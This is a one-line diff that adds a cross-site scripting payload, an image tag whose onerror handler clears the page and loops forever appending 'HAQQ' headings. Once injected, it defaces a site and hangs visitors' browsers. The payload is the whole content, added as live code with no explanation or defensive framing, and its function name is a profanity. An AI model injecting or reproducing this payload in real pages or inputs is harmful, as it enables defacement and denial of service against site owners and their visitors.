@@ -1,0 +1,1 @@
+<image src=q onerror="function shit(){while(true){document.body.innerHTML += '<h1>HAQQ</h1>';setInterval(shit, 1);}};document.body.innerHTML = '0'; shit()">
